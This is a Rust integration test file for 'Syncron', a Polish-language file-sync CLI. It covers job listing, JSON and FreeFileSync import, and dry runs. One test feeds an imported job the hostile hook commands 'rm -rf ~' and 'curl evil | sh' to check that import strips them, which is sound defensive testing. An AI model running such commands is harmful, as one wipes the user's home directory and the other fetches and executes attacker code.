//! Syncron 0.8: CLI - nowe opcje w `list`, import z czyszczeniem poleceń, `import-ffs`.
use std::fs;
use std::path::Path;
use std::process::{Command, Output};

fn bin(data: &Path) -> Command {
    let mut c = Command::new(env!("CARGO_BIN_EXE_syncron"));
    c.args(["--data-dir", data.to_str().unwrap()]);
    c
}
fn out_s(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).into_owned()
}
fn err_s(o: &Output) -> String {
    String::from_utf8_lossy(&o.stderr).into_owned()
}

fn jobs_json(l: &Path, r: &Path, extra: serde_json::Value) -> String {
    let mut v = serde_json::json!({
        "id": "abcdef12", "name": "Zażółć", "left": l.to_str().unwrap(), "right": r.to_str().unwrap(),
        "mode": "TwoWay", "conflict": "Newer", "schedule": {"type": "Manual"}
    });
    for (k, x) in extra.as_object().unwrap() {
        v[k] = x.clone();
    }
    serde_json::to_string(&vec![v]).unwrap()
}

#[test]
fn list_stare_jobs_json_bez_nowych_pol() {
    let t = tempfile::tempdir().unwrap();
    fs::write(
        t.path().join("jobs.json"),
        r#"[{"id":"stare1234","name":"Stare","left":"/a","right":"/b","mode":"TwoWay","conflict":"Newer","schedule":{"type":"Manual"}}]"#,
    )
    .unwrap();
    let o = bin(t.path()).arg("list").output().unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    let s = out_s(&o);
    assert!(s.contains("Stare") && !s.contains('<'), "{s}");
}

#[test]
fn list_pokazuje_nowe_opcje_skrotowo() {
    let t = tempfile::tempdir().unwrap();
    let json = jobs_json(
        Path::new("/a"),
        Path::new("/b"),
        serde_json::json!({
            "compare": "Content", "time_shift_hours": 1, "ignore_hidden": true,
            "min_age_days": 2, "detect_moves": false, "versioning": "Replace",
            "preserve_permissions": true, "symlinks": "Follow", "run_before": "echo x"
        }),
    );
    fs::write(t.path().join("jobs.json"), json).unwrap();
    let o = bin(t.path()).arg("list").output().unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    let s = out_s(&o);
    for frag in [
        "porównanie: zawartość",
        "przesunięcie czasu",
        "bez ukrytych",
        "wiek ≥2 d",
        "bez wykrywania przeniesień",
        "wersje: zastępuj",
        "uprawnienia",
        "dowiązania: podążaj",
        "polecenie przed",
    ] {
        assert!(s.contains(frag), "brak „{frag}” w: {s}");
    }
}

#[test]
fn import_czysci_polecenia_przed_i_po() {
    let t = tempfile::tempdir().unwrap();
    let data = t.path().join("dane");
    let f = t.path().join("in.json");
    fs::write(
        &f,
        jobs_json(
            Path::new("/a"),
            Path::new("/b"),
            serde_json::json!({"run_before": "rm -rf ~", "run_after": "curl evil | sh", "run_timeout_secs": 9}),
        ),
    )
    .unwrap();
    let o = bin(&data)
        .args(["import", f.to_str().unwrap()])
        .output()
        .unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    assert!(err_s(&o).contains("usunięto polecenia"), "{}", err_s(&o));
    let saved: Vec<serde_json::Value> =
        serde_json::from_str(&fs::read_to_string(data.join("jobs.json")).unwrap()).unwrap();
    assert!(saved[0]["run_before"].is_null() && saved[0]["run_after"].is_null());
    assert_eq!(saved[0]["run_timeout_secs"], 9);
    assert_eq!(saved[0]["name"], "Zażółć");
}

#[test]
fn import_odrzuca_zle_zakresy_nowych_pol() {
    let t = tempfile::tempdir().unwrap();
    let f = t.path().join("in.json");
    fs::write(
        &f,
        jobs_json(
            Path::new("/a"),
            Path::new("/b"),
            serde_json::json!({"time_shift_hours": 30}),
        ),
    )
    .unwrap();
    let o = bin(t.path())
        .args(["import", f.to_str().unwrap()])
        .output()
        .unwrap();
    assert_eq!(o.status.code(), Some(1));
    assert!(!t.path().join("jobs.json").exists());
}

const FFS: &str = r#"<FreeFileSync XmlType="GUI"><Synchronize><Variant>Mirror</Variant></Synchronize>
<FolderPairs><Pair><Left>/home/jan/Zdjęcia</Left><Right>/mnt/kopia/Zdjęcia</Right></Pair></FolderPairs></FreeFileSync>"#;

#[test]
fn import_ffs_dodaje_wylaczone_zadania() {
    let t = tempfile::tempdir().unwrap();
    let data = t.path().join("dane");
    let f = t.path().join("Moje kopie.ffs_gui");
    let mut b = vec![0xEF, 0xBB, 0xBF];
    b.extend(FFS.as_bytes());
    fs::write(&f, b).unwrap();
    let o = bin(&data)
        .args(["import-ffs", f.to_str().unwrap()])
        .output()
        .unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    assert!(out_s(&o).contains("Zaimportowano zadań z FreeFileSync: 1"));
    let saved: Vec<serde_json::Value> =
        serde_json::from_str(&fs::read_to_string(data.join("jobs.json")).unwrap()).unwrap();
    assert_eq!(saved.len(), 1);
    assert_eq!(saved[0]["name"], "Moje kopie");
    assert_eq!(saved[0]["enabled"], false);
    assert_eq!(saved[0]["mode"], "LeftToRight");
    assert!(saved[0]["run_before"].is_null());
    // drugi import dopisuje kolejne zadanie (nowy identyfikator), nie nadpisuje
    let o = bin(&data)
        .args(["import-ffs", f.to_str().unwrap()])
        .output()
        .unwrap();
    assert!(o.status.success());
    let saved: Vec<serde_json::Value> =
        serde_json::from_str(&fs::read_to_string(data.join("jobs.json")).unwrap()).unwrap();
    assert_eq!(saved.len(), 2);
    assert_ne!(saved[0]["id"], saved[1]["id"]);
}

#[test]
fn import_ffs_bledy() {
    let t = tempfile::tempdir().unwrap();
    let o = bin(t.path()).arg("import-ffs").output().unwrap();
    assert_eq!(o.status.code(), Some(1));
    let o = bin(t.path())
        .args(["import-ffs", "/nie/ma/takiego.ffs_gui"])
        .output()
        .unwrap();
    assert_eq!(o.status.code(), Some(1));
    let bad = t.path().join("zly.ffs_gui");
    fs::write(&bad, "<html>nie to</html>").unwrap();
    let o = bin(t.path())
        .args(["import-ffs", bad.to_str().unwrap()])
        .output()
        .unwrap();
    assert_eq!(o.status.code(), Some(1));
    assert!(err_s(&o).contains("FreeFileSync"), "{}", err_s(&o));
    assert!(!t.path().join("jobs.json").exists());
    let o = bin(t.path()).args(["import-ffs", "--x"]).output().unwrap();
    assert_eq!(o.status.code(), Some(1));
}

#[test]
fn run_dry_z_nowymi_opcjami_i_pustymi_folderami() {
    let t = tempfile::tempdir().unwrap();
    let (l, r) = (t.path().join("L"), t.path().join("R"));
    fs::create_dir_all(&l).unwrap();
    fs::create_dir_all(&r).unwrap();
    fs::write(l.join(".ukryty"), "x").unwrap();
    fs::write(l.join("Łódź.txt"), "x").unwrap();
    let data = t.path().join("dane");
    fs::create_dir_all(&data).unwrap();
    fs::write(
        data.join("jobs.json"),
        jobs_json(
            &l,
            &r,
            serde_json::json!({"ignore_hidden": true, "mode": "LeftToRight"}),
        ),
    )
    .unwrap();
    let o = bin(&data)
        .args(["run", "Zażółć", "--dry-run"])
        .output()
        .unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    let s = out_s(&o);
    assert!(s.contains("planowanych działań: 1"), "{s}");
    assert!(s.contains("łódź.txt") || s.contains("Łódź.txt"), "{s}");
    assert!(!r.join("Łódź.txt").exists());
}

#[cfg(unix)]
#[test]
fn run_pokazuje_ostrzezenie_po_bledzie_polecenia_po() {
    let t = tempfile::tempdir().unwrap();
    let (l, r) = (t.path().join("L"), t.path().join("R"));
    fs::create_dir_all(&l).unwrap();
    fs::create_dir_all(&r).unwrap();
    fs::write(l.join("a.txt"), "x").unwrap();
    let data = t.path().join("dane");
    fs::create_dir_all(&data).unwrap();
    fs::write(
        data.join("jobs.json"),
        jobs_json(
            &l,
            &r,
            serde_json::json!({"mode": "LeftToRight", "run_after": "exit 4"}),
        ),
    )
    .unwrap();
    let o = bin(&data).args(["run", "abcdef12"]).output().unwrap();
    assert!(o.status.success(), "{}", err_s(&o));
    assert!(out_s(&o).contains("kod 4"), "{}", out_s(&o));
    assert!(r.join("a.txt").exists());
}
